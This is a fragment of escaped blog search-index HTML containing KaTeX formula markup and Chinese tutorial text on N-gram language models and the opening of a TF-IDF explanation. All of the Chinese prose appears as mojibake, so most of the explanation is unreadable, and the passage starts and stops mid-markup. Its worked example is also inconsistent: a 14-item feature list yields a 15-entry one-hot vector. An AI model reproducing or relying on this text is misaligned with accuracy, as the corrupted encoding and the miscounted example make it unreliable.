style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:3.106005em;vertical-align:-1.277669em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mop op-limits&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.8283360000000002em;&#34;&gt;&lt;span style=&#34;top:-1.872331em;margin-left:0em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.05em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mrel mtight&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.050005em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.05em;&#34;&gt;&lt;/span&gt;&lt;span&gt;&lt;span class=&#34;mop op-symbol large-op&#34;&gt;âˆ‘&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-4.3000050000000005em;margin-left:0em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.05em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.277669em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;âˆ£&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;å…¶ä¸­&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;Context&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;å°±æ˜¯è¯è¯­çš„ä¸Šä¸‹æ–‡ï¼Œä¾‹å¦‚&lt;strong&gt;æˆ‘å¯&lt;/strong&gt;çš„&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;Context&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;å°±æ˜¯ï¼š&lt;strong&gt;ç‡•å­ã€æ²¡æœ‰ä½ &lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;è€ŒN-gramå‡è®¾ä¸€ä¸ªè¯çš„ä¹‹å’Œå‰Nä¸ªè¯ç›¸å…³ï¼Œå³é©¬å°”å¯å¤«æ¨¡å‹çš„æ€æƒ³ã€‚&lt;/p&gt;
&lt;h3 id=&#34;å‘é‡è¡¨ç¤º&#34;&gt;å‘é‡è¡¨ç¤º&lt;/h3&gt;
&lt;p&gt;N-Gramæ˜¯ä¸€ç§åŸºäº&lt;strong&gt;ç»Ÿè®¡è¯­è¨€æ¨¡å‹&lt;/strong&gt;çš„ç®—æ³•ã€‚å®ƒçš„åŸºæœ¬æ€æƒ³æ˜¯å°†æ–‡æœ¬é‡Œé¢çš„å†…å®¹æŒ‰ç…§å­—èŠ‚è¿›è¡Œå¤§å°ä¸ºNçš„æ»‘åŠ¨çª—å£æ“ä½œï¼Œå½¢æˆäº†é•¿åº¦æ˜¯Nçš„å­—èŠ‚ç‰‡æ®µåºåˆ—ã€‚&lt;/p&gt;
&lt;p&gt;æ¯ä¸€ä¸ªå­—èŠ‚ç‰‡æ®µç§°ä¸ºgramï¼Œå¯¹æ‰€æœ‰gramçš„å‡ºç°é¢‘åº¦è¿›è¡Œç»Ÿè®¡ï¼Œå¹¶ä¸”æŒ‰ç…§äº‹å…ˆè®¾å®šå¥½çš„é˜ˆå€¼è¿›è¡Œè¿‡æ»¤ï¼Œå½¢æˆå…³é”®gramåˆ—è¡¨ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªæ–‡æœ¬çš„å‘é‡ç‰¹å¾ç©ºé—´ï¼Œåˆ—è¡¨ä¸­çš„æ¯ä¸€ç§gramå°±æ˜¯ä¸€ä¸ªç‰¹å¾å‘é‡ç»´åº¦ã€‚&lt;/p&gt;
&lt;p&gt;ä¾‹å­&lt;br&gt;
æ¯”å¦‚æˆ‘ä»¬ç°åœ¨ä½¿ç”¨&lt;strong&gt;å•å…ƒUnigram&lt;/strong&gt;ã€&lt;strong&gt;äºŒå…ƒçš„Bi-gram&lt;/strong&gt;å’Œ&lt;strong&gt;ä¸‰å…ƒçš„Tri-gram&lt;/strong&gt;æ¨¡å‹æ¥è¿›è¡Œç‰¹å¾æå–ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬çš„è®­ç»ƒæ ·æœ¬ä¸ºï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æˆ‘å»äº†åŒ—äº¬å¤©å®‰é—¨&lt;/li&gt;
&lt;li&gt;æˆ‘æ˜¯ä¸­å›½äºº&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;é‚£ä¹ˆæˆ‘ä»¬å¯¹æ¯ä¸€ä¸ªæ ·æœ¬è¿›è¡Œå•å…ƒUnigramã€äºŒå…ƒçš„Bi-gramå’Œä¸‰å…ƒçš„Tri-gramæ¨¡å‹æå–ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;å•å…ƒUnigram&lt;br&gt;
&lt;strong&gt;æˆ‘å»äº†åŒ—äº¬å¤©å®‰é—¨&lt;/strong&gt; =&amp;gt; &lt;strong&gt;/æˆ‘/å»äº†/åŒ—äº¬/å¤©å®‰é—¨/&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;æˆ‘æ˜¯ä¸­å›½äºº&lt;/strong&gt; =&amp;gt; &lt;strong&gt;/æˆ‘/æ˜¯/ä¸­å›½äºº/&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;äºŒå…ƒBi-gram&lt;br&gt;
&lt;strong&gt;æˆ‘å»äº†åŒ—äº¬å¤©å®‰é—¨&lt;/strong&gt; =&amp;gt; &lt;strong&gt;/æˆ‘ å»äº†/å»äº† åŒ—äº¬/åŒ—äº¬ å¤©å®‰é—¨/&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;æˆ‘æ˜¯ä¸­å›½äºº&lt;/strong&gt; =&amp;gt; &lt;strong&gt;/æˆ‘ æ˜¯/æ˜¯ ä¸­å›½äºº/&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ä¸‰å…ƒTri-gram&lt;br&gt;
&lt;strong&gt;æˆ‘å»äº†åŒ—äº¬å¤©å®‰é—¨&lt;/strong&gt; =&amp;gt; &lt;strong&gt;/æˆ‘ å»äº† åŒ—äº¬/å»äº† åŒ—äº¬ å¤©å®‰é—¨/&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;æˆ‘æ˜¯ä¸­å›½äºº&lt;/strong&gt; =&amp;gt; &lt;strong&gt;/æˆ‘ æ˜¯ ä¸­å›½äºº/&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;é‚£ä¹ˆä»ä¸Šé¢å¯ä»¥å¾—å‡ºï¼Œæˆ‘ä»¬çš„ç‰¹å¾å‘é‡åŒ…å«æˆ‘åœ¨è®­ç»ƒæ•°æ®ä¸­åˆ©ç”¨å•å…ƒUnigramï¼ŒäºŒå…ƒBi-gramï¼Œä»¥åŠä¸‰å…ƒTri-gramæŠ½å–å‡ºçš„ä¸åŒç‰¹å¾ï¼Œç»„æˆæˆ‘çš„ç‰¹å¾å‘é‡ç»´åº¦ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åä»¥åå¯¹åº”ä¸€å¥è¯ï¼Œç›´æ¥è¿›è¡ŒUnigramï¼ŒBi-gramï¼ŒTri-gramè¿›è¡ŒæŠ½å–ç‰¹å¾ï¼Œå‡ºç°å“ªä¸ªç‰¹å¾ï¼Œå°±ç»Ÿè®¡å®ƒçš„é¢‘æ•°ï¼Œæœ€åå¡«åœ¨ç‰¹å¾å‘é‡ä¸­å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;æ¯”å¦‚ä¸Šé¢çš„ç‰¹å¾å‘é‡æˆ‘åˆ—ä¸¾ä¸€ä¸‹é¡ºåºå¦‚ï¼š&lt;/p&gt;
&lt;p&gt;æˆ‘ã€æ˜¯ã€ä¸­å›½äººã€å»äº†ã€åŒ—äº¬ã€å¤©å®‰é—¨ã€æˆ‘ æ˜¯ã€æ˜¯ ä¸­å›½äººã€æˆ‘ å»äº†ã€å»äº† åŒ—äº¬ã€åŒ—äº¬ å¤©å®‰é—¨ã€æˆ‘ å»äº† åŒ—äº¬ã€å»äº† åŒ—äº¬ å¤©å®‰é—¨ã€ æˆ‘ æ˜¯ ä¸­å›½äººã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æŠ½å–ç‰¹å¾è¿‡ç¨‹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆå¯¹äºä¸€å¥è¯&lt;strong&gt;æˆ‘æ˜¯ä¸­å›½äºº&lt;/strong&gt;è¿›è¡ŒN-gramç‰¹å¾æŠ½å–çš„æ–¹æ³•æ˜¯ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;å•å…ƒUnigramæ¥è¯´&lt;br&gt;
&lt;strong&gt;æˆ‘æ˜¯ä¸­å›½äºº&lt;/strong&gt; =&amp;gt; &lt;strong&gt;/æˆ‘/æ˜¯/ä¸­å›½äºº/&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;äºŒå…ƒBi-gram&lt;br&gt;
&lt;strong&gt;æˆ‘æ˜¯ä¸­å›½äºº&lt;/strong&gt; =&amp;gt; &lt;strong&gt;/æˆ‘ æ˜¯/æ˜¯ ä¸­å›½äºº/&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ä¸‰å…ƒTri-gram&lt;br&gt;
&lt;strong&gt;æˆ‘æ˜¯ä¸­å›½äºº&lt;/strong&gt; =&amp;gt; &lt;strong&gt;/æˆ‘ æ˜¯ ä¸­å›½äºº/&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;äºæ˜¯æˆ‘ä»¬å°±åœ¨å‡ºç°çš„è¯è¯­ç»´åº¦èµ‹å€¼ä¸º1ï¼Œå…¶ä½™æ²¡æœ‰å‡ºç°è¿‡çš„ç‰¹å¾èµ‹å€¼ä¸º0ï¼Œç›¸å½“äºone-hotç‰¹å¾ï¼Œå¾—åˆ°ç‰¹å¾å‘é‡ï¼š&lt;code&gt;[1,1,1,0,0,0,1,1,0,0,0,0,0,0,1]&lt;/code&gt;ï¼Œå¾—åˆ°çš„è¿™ä¸ªç‰¹å¾å‘é‡å°±æ˜¯æˆ‘ä»¬ä½¿ç”¨N-gramæå–ç‰¹å¾æ–¹æ³•æå–å‡ºæ¥çš„ç‰¹å¾ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ€»ç»“&#34;&gt;æ€»ç»“&lt;/h3&gt;
&lt;p&gt;å¦‚æœæˆ‘ä»¬ä½¿ç”¨N-gramæå–ç‰¹å¾ï¼Œä½¿ç”¨unigramï¼Œbigramï¼Œtrigramæå–ç‰¹å¾çš„æƒ…å†µï¼Œåœ¨è¯æ±‡è¡¨å¤§å°ä¸º&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;V&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;V&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.22222em;&#34;&gt;V&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;çš„æ—¶å€™ï¼Œç‰¹å¾å‘é‡ç»´åº¦é•¿åº¦ä¸º&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;V&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;V&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;V&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;[V(unigram)+V^2(bigram)+V^3(trigram)]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.22222em;&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.064108em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.22222em;&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.064108em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.22222em;&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ã€‚&lt;/p&gt;
">n-gram</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/tf-idf-bm25/"" data-c="
          &lt;h2 id=&#34;tf-idf&#34;&gt;TF-IDF&lt;/h2&gt;
&lt;p&gt;TF-IDFï¼ˆterm frequencyâ€“inverse document frequencyï¼Œè¯é¢‘-é€†å‘æ–‡ä»¶é¢‘ç‡ï¼‰æ˜¯ä¸€ç§ç”¨äºä¿¡æ¯æ£€ç´¢ï¼ˆinformation retrievalï¼‰ä¸æ–‡æœ¬æŒ–æ˜ï¼ˆtext miningï¼‰çš„å¸¸ç”¨åŠ æƒæŠ€æœ¯ã€‚TF-IDFæ˜¯ä¸€ç§&lt;strong&gt;ç»Ÿè®¡æ–¹æ³•&lt;/strong&gt;ï¼Œç”¨ä»¥è¯„ä¼°ä¸€å­—è¯å¯¹äºä¸€ä¸ªæ–‡ä»¶é›†æˆ–ä¸€ä¸ªè¯­æ–™åº“ä¸­çš„å…¶ä¸­ä¸€ä»½æ–‡ä»¶çš„é‡è¦ç¨‹åº¦ã€‚å­—è¯çš„é‡è¦æ€§éšç€å®ƒåœ¨æ–‡ä»¶ä¸­å‡ºç°çš„æ¬¡æ•°æˆæ­£æ¯”å¢åŠ ï¼Œä½†åŒæ—¶ä¼šéšç€å®ƒåœ¨è¯­æ–™åº“ä¸­å‡ºç°çš„é¢‘ç‡æˆåæ¯”ä¸‹é™ã€‚&lt;/p&gt;
&lt;p&gt;TF-IDFçš„ä¸»è¦æ€æƒ³æ˜¯ï¼š&lt;strong&gt;å¦‚æœæŸä¸ªå•è¯åœ¨ä¸€ç¯‡æ–‡ç« ä¸­å‡ºç°çš„é¢‘ç‡TFé«˜ï¼Œå¹¶ä¸”åœ¨å…¶ä»–æ–‡ç« ä¸­å¾ˆå°‘å‡ºç°ï¼Œåˆ™è®¤ä¸ºæ­¤è¯æˆ–è€…çŸ­è¯­å…·æœ‰å¾ˆå¥½çš„ç±»åˆ«åŒºåˆ†èƒ½åŠ›ï¼Œé€‚åˆç”¨æ¥åˆ†ç±»&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;h3 id=&#34;tfterm-frequency&#34;&gt;TF(Term Frequency)&lt;/h3&gt;
&lt;p&gt;è¯é¢‘(TF)ï¼šè¡¨ç¤ºè¯æ¡ï¼ˆå…³é”®å­—ï¼‰åœ¨æ–‡æœ¬ä¸­å‡ºç°çš„é¢‘ç‡ï¼Œè¿™ä¸ªæ•°å­—é€šå¸¸ä¼šè¢«å½’ä¸€åŒ–(ä¸€èˆ¬æ˜¯è¯é¢‘é™¤ä»¥æ–‡ç« æ€»è¯æ•°), ä»¥é˜²æ­¢å®ƒåå‘é•¿çš„æ–‡ä»¶ã€‚&lt;/p&gt;
